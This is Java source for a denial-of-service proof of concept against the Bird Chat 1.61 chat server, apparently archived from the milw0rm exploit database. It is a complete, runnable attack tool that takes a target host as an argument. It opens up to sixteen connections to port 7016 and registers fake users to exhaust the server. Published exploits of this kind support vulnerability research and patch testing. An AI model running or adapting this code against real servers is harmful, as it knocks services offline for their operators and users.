/*
    Bird Chat 1.61 - Denial Of Service - Proof Of Concept
    Coded by: Donato Ferrante
*/



import java.net.Socket;
import java.net.InetAddress;
import java.net.ConnectException;
import java.net.SocketTimeoutException;
import java.io.OutputStream;
import java.io.InputStream;







public class BirdChat161_DoS_poc {



private final static int MAX_CONNECTION = 16;
private final static int PORT = 7016;
private final static String VERSION = "0.1.0";



public static void main(String [] args){



  System.out.println(
                     "\n\nBird Chat 1.61 - Denial Of Service - Proof Of Concept\n" +
                     "Version: " + VERSION + "\n\n"                 +
                     "coded by: Donato Ferrante\n"                  +
                     "e-mail:   fdonato@autistici.org\n"            +
                     "web:      www.autistici.org/fdonato\;n\n"
                    );


    String host = "localhost";

        try{

            if(args.length != 1)
                usage();

                host = args[0];

        }catch(Exception e){usage();}
    
        try{


            int i = 1,
                var = 0;


           while(i++ <= MAX_CONNECTION){

            try{

               String err = "";
               int port = PORT;
               InetAddress addr = InetAddress.getByName(host);
               Socket socket = new Socket(addr, port);
               socket.setSoTimeout(3000);



               InputStream stream = socket.getInputStream();

                  int line = stream.read();
                   while(line != -1){

                       if(line == '?'){
                           break;
                       }

                       line = stream.read();

                   }


               OutputStream outStream = socket.getOutputStream();
               outStream.write(("*user=fake_user0" + ++var + "\n").getBytes());


                int count = 0;
               line = stream.read();
                    while(true){

                       line = stream.read();

                        if(line == '\n')
                           count++;

                       if(count >= 3)
                           break;
               }


            }catch(SocketTimeoutException ste){break;}
            catch(ConnectException ce){System.err.println(ce); continue;}
        }


        }catch(Exception e){System.err.println(e);}

        System.out.println("\nBird Chat - Denial Of Service - Proof_Of_Concept terminated.\n\n");
    }







    private static void usage(){

        System.out.println("Usage: java BirdChat161_DoS_poc <host>\n\n");    
        System.exit(-1);
    }
}


// milw0rm.com [2004-08-26]